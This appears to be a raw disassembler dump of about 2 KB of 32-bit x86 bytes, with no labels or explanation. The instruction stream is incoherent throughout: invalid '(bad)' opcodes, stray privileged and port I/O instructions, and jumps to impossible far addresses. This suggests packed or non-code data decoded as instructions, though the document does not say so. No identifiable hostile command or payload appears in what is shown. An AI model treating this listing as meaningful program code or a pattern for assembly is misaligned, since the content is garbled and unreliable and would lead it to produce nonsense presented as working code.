  404c65:	xlat   BYTE PTR ds:[ebx]
  404c66:	ins    BYTE PTR es:[edi],dx
  404c67:	or     al,bh
  404c69:	add    BYTE PTR [edx+0xc48315],bl
	...
  404c7b:	add    BYTE PTR [eax],al
  404c7d:	jo     0x404c84
  404c7f:	jne    0x404c67
  404c81:	int    0x6
  404c83:	add    cl,ch
  404c85:	pusha  
  404c86:	mov    al,ds:0x811e4202
  404c8b:	ret    
  404c8c:	(bad)  
  404c8d:	xchg   ebp,eax
  404c8e:	mov    esi,0x5260edc2
  404c93:	mov    eax,DWORD PTR ds:0xff4c1df
  404c99:	shr    DWORD PTR [edi+edi*8-0x71537900],1
  404ca0:	test   esi,esi
  404ca2:	jne    0x404ca3
  404ca4:	inc    DWORD PTR [ebp+0x7d]
  404ca7:	clc    
  404ca8:	(bad)  
  404ca9:	std    
  404caa:	jbe    0x404cac
  404cac:	add    dl,bh
  404cae:	or     bh,al
  404cb0:	test   DWORD PTR [esi-0x34000089],edi
  404cb6:	or     BYTE PTR [eax],al
  404cb8:	add    BYTE PTR [edi],ch
  404cba:	test   BYTE PTR [eax],al
  404cbc:	call   FWORD PTR [ebp-0x4d8a008a]
  404cc2:	test   DWORD PTR [eax],eax
  404cc4:	lea    eax,[edi+0x6d]
  404cc7:	(bad)  
  404cc8:	(bad)  
  404cc9:	std    
  404cca:	push   ecx
  404ccb:	push   0x0
  404ccd:	push   eax
  404cce:	add    DWORD PTR [ebp-0x88017b],ecx
  404cd4:	call   FWORD PTR [edx+0xb]
  404cd7:	add    al,ch
  404cd9:	outs   dx,BYTE PTR ds:[esi]
  404cda:	sbb    DWORD PTR [eax],eax
  404cdc:	add    cl,bh
  404cde:	pop    eax
  404cdf:	push   DWORD PTR [eax+eax*1+0x0]
	...
  404cef:	add    BYTE PTR [esi-0x798a4057],al
  404cf5:	mov    cl,0xbf
  404cf7:	jmp    0x404c80
  404cf9:	and    BYTE PTR [ecx],al
  404cfb:	add    BYTE PTR [edx+0x8],bh
  404cfe:	leave  
  404cff:	ret    0x852
  404d02:	push   ebp
  404d03:	mov    ebx,DWORD PTR [esi+0x9fcc482]
  404d09:	leave  
  404d0a:	fisubr DWORD PTR [edx+0x0]
  404d0d:	jne    0x404d84
  404d0f:	or     BYTE PTR [edx+0x6dffff2c],dl
  404d15:	stos   BYTE PTR es:[edi],al
  404d16:	mov    edi,0x5a09d674
  404d1b:	inc    edi
  404d1d:	scas   eax,DWORD PTR es:[edi]
  404d1e:	out    0x7f,eax
  404d20:	jge    0x404d98
  404d22:	dec    DWORD PTR [ebx]
  404d24:	arpl   si,bx
  404d26:	ss add bh,al
  404d29:	popa   
  404d2a:	sbb    eax,0x7e9d7900
  404d2f:	inc    ebp
  404d30:	cld    
  404d31:	lea    esi,[eax+0x7066b75]
  404d37:	mov    eax,0xc0869e63
  404d3c:	gs push cs
  404d3e:	jge    0x404d85
  404d40:	ja     0x404d28
  404d42:	inc    esi
  404d43:	dec    DWORD PTR [esi-0x60]
  404d46:	je     0x404d49
  404d48:	fdiv   st,st(0)
  404d4a:	dec    DWORD PTR [edx+0x6a045871]
  404d50:	bound  ebx,QWORD PTR [ecx]
  404d52:	inc    esi
  404d53:	inc    DWORD PTR [eax]
	...
  404d61:	add    BYTE PTR [eax],al
  404d63:	adc    esi,DWORD PTR [ebx+0x36]
  404d66:	or     al,0xac
  404d68:	unpcklps xmm7,xmm7
  404d6b:	cs mov dl,0x9b
  404d6e:	mov    eax,0x3bb08abf
  404d73:	push   ds
  404d74:	scas   al,BYTE PTR es:[edi]
  404d75:	xor    eax,0x86a17802
  404d7a:	fisttp DWORD PTR [edi]
  404d7c:	push   edx
  404d7d:	jl     0x404d42
  404d7f:	sbb    BYTE PTR [ebp-0x3b],dh
  404d82:	adc    al,0x63
  404d84:	or     DWORD PTR [ebp-0x14],edi
  404d87:	loop   0x404dea
  404d89:	add    edi,eax
  404d8b:	and    dl,BYTE PTR fs:[ebx+ebp*1+0x38]
  404d90:	xlat   BYTE PTR ds:[ebx]
  404d91:	dec    ebp
  404d92:	dec    esi
  404d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d95:	fwait
  404d96:	sbb    BYTE PTR [esp+edi*1-0x50],cl
  404d9a:	or     esp,DWORD PTR [ebx]
  404d9c:	imul   ebp,DWORD PTR [eax],0x35eb996a
  404da2:	or     BYTE PTR [ebx-0x59],cl
  404da5:	mov    al,0xff
  404da7:	sub    al,0xa8
  404da9:	ret    
  404daa:	jne    0x404e0d
  404dac:	add    eax,0x28e25812
  404db1:	stc    
  404db2:	add    ebp,DWORD PTR [ebx+0x5]
  404db5:	jmp    0xe9adb1f3
  404dba:	sti    
  404dbb:	add    al,0xab
  404dbd:	adc    al,BYTE PTR [eax+ebp*8]
  404dc0:	inc    eax
  404dc1:	fstp   DWORD PTR ds:0x86645563
	...
  404dd3:	add    BYTE PTR [eax],al
  404dd5:	add    BYTE PTR [ebx-0x53],ah
  404dd8:	out    dx,al
  404dd9:	scas   eax,DWORD PTR es:[edi]
  404dda:	xchg   ebx,eax
  404ddb:	stos   BYTE PTR es:[edi],al
  404ddc:	pop    esp
  404ddd:	cld    
  404dde:	les    ebp,FWORD PTR [esi]
  404de0:	xchg   esi,eax
  404de1:	add    al,0x63
  404de3:	sub    BYTE PTR [ecx-0x2619ed3],0x38
  404dea:	pusha  
  404deb:	inc    esi
  404dec:	shl    bh,cl
  404dee:	sub    al,0x7e
  404df0:	adc    al,0x0
  404df2:	call   0x1344910e
  404df7:	js     0x404e5d
  404df9:	add    al,0xab
  404dfb:	stos   BYTE PTR es:[edi],al
  404dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dfd:	push   esp
  404dfe:	pushf  
  404dff:	xor    ch,ch
  404e01:	scas   al,BYTE PTR es:[edi]
  404e02:	xor    DWORD PTR ds:0x1527dd31,edx
  404e08:	push   0x31
  404e0a:	jae    0x404e11
  404e0c:	cld    
  404e0d:	add    ah,BYTE PTR [eax]
  404e0f:	sahf   
  404e10:	in     eax,0x88
  404e12:	cwde   
  404e13:	xor    DWORD PTR [eax+0x7b],edx
  404e16:	mov    al,ds:0x57c2a04e
  404e1b:	add    eax,0x864f7abc
  404e20:	and    eax,0x55f6acac
  404e25:	sbb    ah,BYTE PTR [ebx+0x52]
  404e28:	dec    esi
  404e29:	cmp    DWORD PTR [ebx-0x63],ebx
  404e2c:	sbb    cl,bl
  404e2e:	cmp    al,0xaa
  404e30:	es dec ecx
  404e32:	aaa    
  404e33:	add    eax,0x560e900
  404e38:	mov    edx,DWORD PTR [eax+eax*1+0x0]
	...
  404e47:	add    BYTE PTR [eax],al
  404e49:	sub    BYTE PTR [edi+0x12],bh
  404e4c:	je     0x404df8
  404e4e:	lods   eax,DWORD PTR ds:[esi]
  404e4f:	push   eax
  404e50:	xchg   ebx,eax
  404e51:	pop    esp
  404e52:	js     0x404e99
  404e54:	adc    eax,0xe175aab7
  404e59:	mov    ch,0x56
  404e5b:	or     al,0xae
  404e5d:	out    0x27,eax
  404e5f:	cld    
  404e60:	in     al,dx
  404e61:	cli    
  404e62:	clc    
  404e63:	or     DWORD PTR [ebp-0x16],edi
  404e66:	xchg   BYTE PTR [ebp-0xf],bh
  404e69:	pusha  
  404e6a:	xor    cl,cl
  404e6c:	sbb    ah,BYTE PTR [edi-0x628dfa63]
  404e72:	test   eax,eax
  404e74:	jmp    0x5060:0xe5c2bc1d
  404e7b:	mov    edx,ebp
  404e7d:	loope  0x404e3f
  404e7f:	hlt    
  404e80:	sbb    cl,BYTE PTR [ebx*1+0x560f398]
  404e87:	call   0xffea4b6a
  404e8c:	jo     0x404eb9
  404e8e:	test   eax,0x54db248d
  404e93:	call   0xffe9e86d
  404e98:	ficomp DWORD PTR [ecx+0x79131e1e]
  404e9e:	and    DWORD PTR [eax],eax
  404ea0:	and    DWORD PTR [eax+0x5],0xffffffff
  404ea4:	cld    
  404ea5:	mov    ah,0xa9
  404ea7:	jne    0x404e8a
  404ea9:	enter  0xfe80,0x66
	...
  404eb9:	add    BYTE PTR [eax],al
  404ebb:	add    BYTE PTR ds:0xdceec083,cl
  404ec1:	cmc    
  404ec2:	add    cl,ch
  404ec4:	pusha  
  404ec5:	test   al,0x75
  404ec7:	push   ebp
  404ec8:	call   0xa5412a46
  404ecd:	push   edi
  404ece:	cmp    eax,0x4a000
  404ed3:	jbe    0x404f14
  404ed5:	mov    bl,BYTE PTR [ecx+eax*1]
  404ed8:	cmp    al,BYTE PTR ds:0x8c7e75ff
  404ede:	pop    edx
  404edf:	push   DWORD PTR [ebp+0x57]
  404ee2:	test   eax,eax
  404ee4:	out    dx,al
  404ee5:	sar    bh,0x75
  404ee8:	outs   dx,BYTE PTR ds:[esi]
  404ee9:	mov    WORD PTR [ebp-0x74a89a23],cs
  404eef:	push   ebp
  404ef0:	out    dx,al
  404ef1:	adc    ch,BYTE PTR cs:[edx-0x6]
  404ef5:	or     al,0x34
  404ef7:	and    edx,edi
  404ef9:	add    al,0xff
  404efb:	jne    0x404ec3
  404efd:	pop    edx
  404efe:	jne    0x404ef4
  404f00:	mov    ch,0x53
  404f02:	or     al,0xc7
  404f04:	jg     0x404f5f
  404f06:	add    BYTE PTR [eax],al
  404f08:	mov    edx,0x51fc6804
  404f0d:	inc    esp
  404f0e:	add    bh,bh
  404f10:	outs   dx,DWORD PTR ds:[esi]
  404f11:	jne    0x404efb
  404f13:	sbb    DWORD PTR [ecx+eax*1],ebp
  404f16:	add    BYTE PTR [ebx-0x3f],dl
  404f19:	les    esi,FWORD PTR [esi+esi*1+0x11]
  404f1d:	pop    ecx
  404f1e:	push   0xfc
	...
  404f2f:	mov    cl,0x43
  404f31:	add    al,ch
  404f33:	push   0x2d
  404f35:	add    BYTE PTR [eax],al
  404f37:	jns    0x404f95
  404f39:	push   edi
  404f3a:	inc    edi
  404f3b:	icebp  
  404f3c:	mov    ecx,0x49b94b9
  404f41:	add    BYTE PTR [eax-0x47518979],dh
  404f47:	push   cs
  404f48:	adc    al,0x0
  404f4a:	add    BYTE PTR [ecx-0x3c],dh
  404f4d:	mov    BYTE PTR [edi-0x4b],0x1
  404f51:	push   edi
  404f52:	push   ebx
  404f53:	arpl   WORD PTR [esi-0x4f],ax
  404f56:	mov    ch,0x63
  404f58:	sahf   
  404f59:	jp     0x404fa0
  404f5b:	cmp    ebx,DWORD PTR [edi-0x3b]
  404f5e:	inc    edi
  404f5f:	xor    al,0x99
  404f61:	dec    esp
  404f62:	pop    ebx
  404f63:	mov    ebx,0x6340dfa2
  404f68:	xlat   BYTE PTR ds:[ebx]
  404f69:	ss cld 
  404f6b:	or     ebp,esi
  404f6d:	jbe    0x404f6f
  404f6f:	arpl   WORD PTR [ebx-0x8],bp
  404f72:	mov    edi,0xf8785a97
  404f77:	jnp    0x404f43
  404f79:	fild   WORD PTR [eax+0x63]
  404f7c:	push   ss
  404f7d:	in     eax,0xb3
  404f7f:	arpl   WORD PTR [esi+0x5794f800],bx
  404f85:	js     0x404f66
  404f87:	stos   BYTE PTR es:[edi],al
  404f88:	push   ecx
  404f89:	adc    eax,DWORD PTR [eax]
  404f8b:	arpl   WORD PTR [esi+0x6605f1fe],cx
  404f91:	xchg   edi,eax
  404f92:	adc    DWORD PTR [eax],eax
	...
  404fa0:	add    BYTE PTR [eax],al
  404fa2:	arpl   WORD PTR [esi-0x21623f28],bx
  404fa8:	lods   al,BYTE PTR ds:[esi]
  404fa9:	add    BYTE PTR [ebx+ecx*1],dl
  404fac:	pushf  
  404fad:	addr16 mov cl,0x66
  404fb0:	lods   al,BYTE PTR ds:[esi]
  404fb1:	mov    edx,DWORD PTR [esi]
  404fb3:	into   
  404fb4:	clc    
  404fb5:	shr    DWORD PTR [edi],1
  404fb7:	mov    ds:0x9788027a,al
  404fbc:	push   ebx
  404fbd:	call   0xffeccb54
  404fc2:	sub    al,0x58
  404fc4:	inc    esp
  404fc5:	call   DWORD PTR [esi-0x29]
  404fc8:	dec    eax
  404fc9:	push   esi
  404fcb:	sub    DWORD PTR [ebx-0x53d969db],ebx
  404fd1:	sub    esi,0x35
  404fd4:	add    esi,DWORD PTR [edi+0x5c]
  404fd7:	pop    edi
  404fd8:	inc    esi
  404fd9:	clc    
  404fda:	arpl   WORD PTR ds:0xa66363e9,ax
  404fe0:	aam    0xab
  404fe2:	dec    esp
  404fe3:	xor    DWORD PTR [ebp-0x54],ebx
  404fe6:	into   
  404fe7:	std    
  404fe8:	inc    eax
  404fe9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404fec:	inc    esi
  404fed:	lods   al,BYTE PTR ds:[esi]
  404fee:	scas   al,BYTE PTR es:[edi]
  404fef:	mov    cl,0x51
  404ff1:	xchg   BYTE PTR [ecx],cl
  404ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ff4:	ss clc 
  404ff6:	in     al,0x30
  404ff8:	jmp    0x404f92
  404ffa:	js     0x404ff6
  404ffc:	sub    BYTE PTR [edi],dh
  404ffe:	ins    BYTE PTR es:[edi],dx
  404fff:	jp     0x404fb5
  405001:	mov    bh,0xd8
  405003:	adc    edx,DWORD PTR [esi]
  405005:	add    BYTE PTR ss:[eax],al
	...
  405014:	add    BYTE PTR [edi-0x5a],dl
  405017:	xchg   esp,eax
  405018:	mov    bh,0xfc
  40501a:	push   ebx
  40501b:	mov    ebp,0xe42e2386
  405020:	push   0x3e90562
  405025:	fcom   DWORD PTR [eax-0xb]
  405028:	ja     0x40509b
  40502a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40502b:	pop    esp
  40502c:	mov    al,0xd4
  40502e:	push   ebx
  40502f:	icebp  
  405030:	stos   BYTE PTR es:[edi],al
  405031:	push   esi
  405032:	test   eax,0xa6c17fc1
  405037:	into   
  405038:	jg     0x404fda
  40503a:	inc    esi
  40503b:	and    bh,BYTE PTR [ebp+0x50e8f9a1]
  405041:	fcomp  DWORD PTR [ecx+0x4ef3c06a]
  405047:	sbb    bl,bh
  405049:	mov    ecx,0x94e3e91d
  40504e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40504f:	xchg   ecx,eax
  405050:	add    BYTE PTR [ecx+0x1e7d96a6],0xa9
  405057:	add    DWORD PTR [ebx+eax*2],eax
  40505a:	add    eax,0xa2fa9be9
  40505f:	jle    0x40500c
  405061:	fiadd  DWORD PTR [eax+0x0]
  405064:	cmp    eax,0xe9200547
  405069:	pusha  
  40506a:	popf   
  40506b:	ins    BYTE PTR es:[edi],dx
  40506c:	dec    ebx
  40506d:	or     BYTE PTR [esi+0x78c4a489],ah
  405073:	jge    0x40509e
  405075:	mov    dh,0xe9
  405077:	(bad)  
  405078:	call   0x40507d
	...
  405085:	add    BYTE PTR [eax],al
  405087:	add    BYTE PTR [eax-0xe],ah
  40508a:	mov    edi,0x45be953a
  40508f:	sub    DWORD PTR [ebx],edi
  405091:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405092:	(bad)  
  405093:	jmp    0x2f1490b9
  405098:	push   0xa22e0005
  40509d:	mov    ch,0xff
  40509f:	(bad)  
  4050a0:	pusha  
  4050a1:	add    eax,0x75bc9cff
  4050a6:	inc    ebp
  4050a7:	cmp    eax,ecx
  4050a9:	das    
  4050aa:	mov    ah,0x76
  4050ac:	mov    ds:0x20a48d99,al
  4050b1:	push   ebp
  4050b2:	push   0x800560e9
  4050b7:	and    DWORD PTR [eax-0x5a],0x75
  4050bb:	icebp  
  4050bc:	clc    
  4050bd:	bound  esi,QWORD PTR [ecx+ebp*8+0x5dbffa60]
  4050c4:	popa   
  4050c5:	cmp    BYTE PTR [ebp-0x47],0x60
  4050c9:	xor    BYTE PTR ds:0x4fad0,al
  4050cf:	jmp    0xb6f09075
  4050d4:	pop    ecx
  4050d5:	add    eax,0x75235c00
  4050da:	push   eax
  4050db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4050dc:	push   ebx
  4050dd:	imul   ebp,DWORD PTR [eax-0x17],0x64800560
  4050e4:	and    eax,ebp
  4050e6:	push   eax
  4050e7:	or     DWORD PTR [ebx+0x71],0x0
	...
  4050fa:	add    BYTE PTR [edx-0x788a405a],cl
  405100:	mov    BYTE PTR [ecx-0x74fe8600],ch
  405106:	inc    ebp
  405107:	xchg   esi,eax
  405108:	mov    BYTE PTR [eax],0x0
  40510b:	iret   
  40510c:	in     eax,dx
  40510d:	mov    edi,0x96eb9
  405112:	add    BYTE PTR [ecx-0x37],ch
  405115:	rep stos BYTE PTR es:[edi],al
  405117:	test   DWORD PTR [ebp-0x40],eax
  40511a:	cmp    al,0x4a
  40511c:	or     DWORD PTR [eax],eax
  40511e:	push   edi
  405120:	xor    al,0x8f
  405122:	inc    ebp
  405123:	sahf   
  405124:	mov    DWORD PTR [ebp-0x2c],0xf4d
  40512b:	inc    ebp
  40512c:	inc    ebp
  40512d:	lock dec DWORD PTR ds:0xb78d0009
  405134:	enter  0x6a50,0xa
  405138:	add    eax,DWORD PTR [eax]
  40513a:	push   DWORD PTR [edi+0x2c]
  40513d:	call   0x488773
  405142:	or     edi,DWORD PTR [edx]
  405144:	hlt    
  405145:	add    eax,0xb84f83
  40514a:	jne    0x405114
  40514c:	and    DWORD PTR [eax-0x1],0x75ff6d37
  405153:	out    0x1,al
  405155:	push   ss
  405156:	sub    al,0x8b
  405158:	or     edi,edi
  40515a:	jne    0x40513a
  40515c:	or     edx,0xb3
	...
  40516e:	mov    edx,0x8ac48308
  405173:	popf   
  405174:	mov    dh,0x45
  405176:	repnz cmp DWORD PTR [edx+0x0],ebp
  40517a:	mov    ebp,0xdce8fbf4
  40517f:	jae    0x405180
  405181:	jmp    DWORD PTR [ebx-0x59]
  405184:	ret    
  405185:	jne    0x4051e8
  405187:	xchg   edi,ebp
  405189:	mov    BYTE PTR [esi],bl
  40518b:	inc    esi
  40518c:	test   eax,0x2576af75
  405191:	mov    dl,0x63
  405193:	scas   al,BYTE PTR es:[edi]
  405194:	push   ebx
  405195:	call   esi
  405197:	repnz test al,0x75
  40519a:	sbb    esi,DWORD PTR [esi]
  40519c:	dec    edi
  40519d:	sti    
  40519e:	dec    esp
  40519f:	inc    ebx
  4051a0:	std    
  4051a1:	mov    edi,0x109cb0ce
  4051a6:	cmp    al,0xb9
  4051a8:	adc    edi,edi
  4051aa:	scas   al,BYTE PTR es:[edi]
  4051ab:	call   0xfcef:0x35eb75a8
  4051b2:	and    al,0xdb
  4051b4:	jl     0x40518e
  4051b6:	sbb    al,0x59
  4051b8:	imul   ebp,eax,0x66
  4051bb:	inc    edx
  4051bc:	add    al,0x0
  4051be:	or     al,0x79
  4051c0:	outs   dx,DWORD PTR ds:[esi]
  4051c1:	call   0xffe95efc
  4051c6:	cld    
  4051c7:	js     0x405230
  4051c9:	call   0xffe95f0c
  4051ce:	in     al,dx
  4051cf:	sbb    BYTE PTR [edi+0xe8],ah
	...
  4051e1:	inc    esi
  4051e2:	or     eax,0xeee8ffa9
  4051e7:	dec    esp
  4051e8:	pop    edi
  4051e9:	stos   BYTE PTR es:[edi],al
  4051ea:	outs   dx,DWORD PTR ds:[esi]
  4051eb:	idiv   edi
  4051ed:	aaa    
  4051ee:	pop    ss
  4051ef:	xchg   edi,eax
  4051f0:	sbb    DWORD PTR [edi+0x6f457cb9],0xffffffa7
  4051f7:	ret    
  4051f8:	je     0x405257
  4051fa:	jae    0x4051ff
  4051fc:	add    BYTE PTR [ebx-0x52],ah
  4051ff:	add    eax,edi
  405201:	push   ds
  405202:	pop    edx
  405203:	add    eax,DWORD PTR [eax]
  405205:	arpl   WORD PTR [esi+0x4974576],bp
  40520b:	cmp    DWORD PTR [ecx+0x2e9e1116],ebp
  405211:	pop    ebx
  405212:	lods   eax,DWORD PTR ds:[esi]
  405213:	add    BYTE PTR [edx+0x266aa37c],ch
  405219:	ja     0x40521f
  40521b:	std    
  40521c:	adc    cl,bh
  40521e:	add    al,0x7e
  405220:	cs push edi
  405222:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405223:	cld    
  405224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405225:	dec    ebx
  405226:	cmp    al,0x6f
  405228:	test   al,0x54
  40522a:	ss cs dec di
  40522e:	scas   al,BYTE PTR es:[edi]
  40522f:	cmp    DWORD PTR [ebx-0x454e5cbc],esp
  405235:	and    DWORD PTR [esi],ecx
  405237:	jmp    0x6af23a8a
  40523c:	mov    edi,0x3e262c2f
  405241:	daa    
  405242:	add    eax,0x21e9
	...
  405253:	add    BYTE PTR [ecx+ecx*2],ah
  405256:	das    
  405257:	or     DWORD PTR [ebx+0x2f],esp
  40525a:	in     eax,dx
  40525b:	jbe    0x405203
  40525d:	mov    eax,ds:0x5e31bb9
  405262:	jmp    0xee2dd6a
  405267:	add    esp,DWORD PTR [ebx-0x5e]
  40526a:	jl     0x405267
  40526c:	add    al,0x75
  40526e:	cmp    al,BYTE PTR [ebx]
  405270:	arpl   sp,cx
  405272:	sub    edi,edi
  405274:	fdivr  QWORD PTR [ecx]
  405276:	bound  edx,QWORD PTR [edi+0x4f95c9e0]
  40527c:	xor    dl,cl
  40527e:	and    al,0x58
  405280:	arpl   WORD PTR ds:0xbe7003e9,ax
  405286:	inc    ecx
  405287:	add    al,0x53
  405289:	add    eax,0xa5ca9be9
  40528e:	mov    esi,0x48daa7
  405293:	test   eax,0xe910057f
  405298:	pusha  
  405299:	lods   eax,DWORD PTR ds:[esi]
  40529a:	mov    WORD PTR [ecx+0x2489a2c4],cs
  4052a0:	imul   DWORD PTR [eax+eax*1]
  4052a3:	stc    
  4052a4:	pusha  
  4052a5:	add    eax,0xa2bf0ee8
  4052aa:	push   DWORD PTR [eax+0x22]
  4052ad:	popa   
  4052ae:	(bad)  
  4052af:	cld    
  4052b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b1:	pop    esp
  4052b2:	cmp    al,0xe9
  4052b4:	pusha  
  4052b5:	add    eax,0xa933
	...
  4052c6:	add    BYTE PTR [eax],dl
  4052c8:	outs   dx,DWORD PTR ds:[esi]
  4052c9:	(bad)  
  4052ca:	lods   al,BYTE PTR ds:[esi]
  4052cb:	or     al,0xe1
  4052cd:	(bad)  
  4052ce:	call   0x29b5f533
  4052d3:	mov    ah,0x48
  4052d5:	aam    0x4e
  4052d7:	jb     0x405336
  4052d9:	(bad)  
  4052da:	lods   al,BYTE PTR ds:[esi]
  4052db:	lock leave 
  4052dd:	inc    ebp
  4052de:	and    esp,edi
  4052e0:	adc    DWORD PTR [eax],eax
  4052e2:	jmp    0x2f349ac4
  4052e7:	or     al,0xa2
  4052e9:	push   DWORD PTR [edx+eiz*4-0x37]
  4052ed:	push   eax
  4052ee:	xchg   ecx,eax
  4052ef:	pusha  
  4052f0:	add    eax,0x5596900
  4052f5:	call   DWORD PTR [eax+edi*8+0x673bb5a9]
  4052fc:	add    eax,0xb33290b
  405301:	xor    DWORD PTR [esp+ebp*4+0x4],0x75
  405306:	in     al,0xf7
  405308:	lahf   
  405309:	add    cl,ch
  40530b:	pusha  
  40530c:	retf   0x9945
  40530f:	std    
  405310:	adc    DWORD PTR [eax],eax
  405312:	jmp    0x39f09b52
  405317:	cld    
  405318:	pop    ss
  405319:	mov    esp,0x91200
  40531e:	add    BYTE PTR [edx],bh
  405320:	sbb    eax,0x817ac445
  405325:	nop
  405326:	mov    dl,0x8a
  405328:	add    eax,0xc00b
	...
  405339:	add    BYTE PTR [edi+0x4],ch
  40533c:	jmp    0x45ce19
  405341:	mov    ecx,DWORD PTR [edi+0x31]
  405344:	mov    BYTE PTR [eax],0x8a
  405347:	sbb    al,0x7d
  405349:	les    esp,FWORD PTR [ebx]
  40534b:	stos   BYTE PTR es:[edi],al
  40534c:	(bad)  
  40534d:	(bad)  
  40534e:	jp     0x4052e6
  405350:	mov    edi,0x455fa0f3
  405355:	les    eax,FWORD PTR [esi]
  405357:	add    eax,0xd5c50000
  40535c:	mov    bh,0x8f
  40535e:	call   DWORD PTR [edi+eax*8+0x45]
  405362:	jb     0x4053cb
  405364:	str    WORD PTR [edx+0x60]
  405368:	inc    ebp
  405369:	hlt    
  40536a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40536b:	xchg   edi,eax
  40536c:	(bad)  
  40536d:	push   DWORD PTR [edi+0x2050c445]
  405373:	add    eax,0xd545006a
  405378:	mov    ebx,0x16bee8
  40537d:	add    BYTE PTR [ecx],dl
  40537f:	lds    esi,FWORD PTR [esi+eax*1-0x77]
  405383:	in     eax,dx
  405384:	rol    DWORD PTR [eax],cl
  405386:	iret   
  405387:	add    eax,0x4fa8ce9
  40538c:	add    bh,bh
  40538e:	outs   dx,DWORD PTR ds:[esi]
  40538f:	hlt    
  405390:	(bad)  
  405391:	jne    0x40531d
  405393:	addr16 jne 0x40534e
  405396:	loop   0x405334
  405398:	sub    al,BYTE PTR [ecx-0x46]
  40539b:	imul   esi,DWORD PTR [ebp-0x44],0x0
	...
  4053aa:	add    BYTE PTR [eax],al
  4053ac:	add    BYTE PTR [edx+0x6300b1d2],dh
  4053b2:	scas   al,BYTE PTR es:[edi]
  4053b3:	add    ah,0x4f
  4053b6:	mov    edi,0xfe8f456c
  4053bb:	sbb    DWORD PTR [eax],eax
  4053bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053be:	fld    st(3)
  4053c0:	call   0xffe5aa5d
  4053c5:	push   0x78022f6e
  4053ca:	dec    eax
  4053cb:	jnp    0x405412
  4053cd:	iret   
  4053ce:	jg     0x4053ff
  4053d0:	mov    ah,0x8b
  4053d2:	dec    ebp
  4053d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053d4:	push   DWORD PTR [edi+ecx*4+0x2f]
  4053d8:	mov    esp,0x73f67b
  4053dd:	arpl   si,di
  4053df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053e0:	jne    0x405401
  4053e2:	pop    ss
  4053e3:	das    
  4053e4:	mov    ah,0x4b
  4053e6:	hlt    
  4053e7:	stos   BYTE PTR es:[edi],al
  4053e8:	dec    DWORD PTR [ebx+edx*4-0x3d]
  4053ec:	jne    0x40544f
  4053ee:	xor    esi,ebx
  4053f0:	cmp    BYTE PTR [esi+0x4f74039e],0x4f
  4053f7:	das    
  4053f8:	adc    BYTE PTR [ecx+eiz*2],ch
  4053fb:	idiv   esi
  4053fd:	scas   al,BYTE PTR es:[edi]
  4053fe:	sbb    bl,BYTE PTR [eax+eax*2+0xba4d71a]
  405405:	and    ebx,DWORD PTR [ecx+0x1]
  405408:	jmp    0x40547e
  40540a:	adc    ecx,esp
  40540c:	or     ebp,DWORD PTR [eax]
  40540e:	jp     0x405422
  405410:	lea    eax,[eax]
	...
  40541e:	add    BYTE PTR [eax],al
  405420:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405421:	dec    edx
  405422:	push   esp
  405423:	jmp    FWORD PTR [esi-0x66]
  405426:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405427:	jne    0x4053e0
  405429:	cmc    
  40542a:	or     bh,bl
  40542c:	in     al,0x9e
  40542e:	js     0x405408
  405430:	fsub   QWORD PTR [eax]
  405432:	outs   dx,DWORD PTR ds:[esi]
  405433:	call   0x44310a
  405438:	int3   
  405439:	add    al,0x5c
  40543b:	les    edi,FWORD PTR [ebx-0x435b420b]
  405441:	lahf   
  405442:	pop    esp
  405443:	push   0xa4ae0dcb
  405448:	lods   al,BYTE PTR ds:[esi]
  405449:	lahf   
  40544a:	cmp    al,0x6c
  40544c:	mov    ebx,0x9ca49e05
  405451:	xor    DWORD PTR [eax+ebx*2],0x63
  405455:	sbb    ecx,esp
  405457:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405458:	push   ss
  405459:	jno    0x4053ec
  40545b:	mov    al,0xa5
  40545d:	lahf   
  40545e:	sahf   
  40545f:	js     0x405401
  405461:	cmp    esi,DWORD PTR [esi]
  405463:	mov    ebx,0x4ee8f4a1
  405468:	fdiv   DWORD PTR [eax+0x336bbf6a]
  40546e:	ror    al,cl
  405470:	loopne 0x405492
  405472:	in     eax,0x3
  405474:	iret   
  405475:	dec    edi
  405476:	push   0x26
  405478:	jae    0x40547f
  40547a:	fnstsw WORD PTR [ebx]
  40547c:	(bad)  
  40547d:	dec    eax
  40547e:	pop    ebp
  40547f:	push   ebx
  405480:	cmp    al,0x19
  405482:	in     eax,0x9b
	...
  405490:	add    BYTE PTR [eax],al
  405492:	add    BYTE PTR [edi],ch
  405494:	push   esi
  405495:	jmp    0xc2063a9d
  40549a:	repz and eax,0xe79bed19
  4054a0:	mov    bh,0x36
  4054a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054a3:	jmp    0x11a1:0x96a43148
  4054aa:	data16 mov ah,0x5
  4054ad:	jmp    0xf05a11aa
  4054b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054b3:	outs   dx,BYTE PTR ds:[esi]
  4054b4:	cmc    
  4054b5:	or     eax,0x635eb2e
  4054ba:	cs pop ebx
  4054bc:	lods   eax,DWORD PTR ds:[esi]
  4054bd:	jmp    0xa862:0x9edca5
  4054c4:	sahf   
  4054c5:	jne    0x4054b4
  4054c7:	jmp    0x612a0433
  4054cc:	sahf   
  4054cd:	jne    0x4054bc
  4054cf:	or     BYTE PTR [esi],bh
  4054d1:	fcom   st(6)
  4054d3:	add    BYTE PTR [ebx-0x3c61cd3d],cl
  4054d9:	or     al,0xe9
  4054db:	imul   ecx,DWORD PTR [edx+0x15ab68ec],0xfffffffe
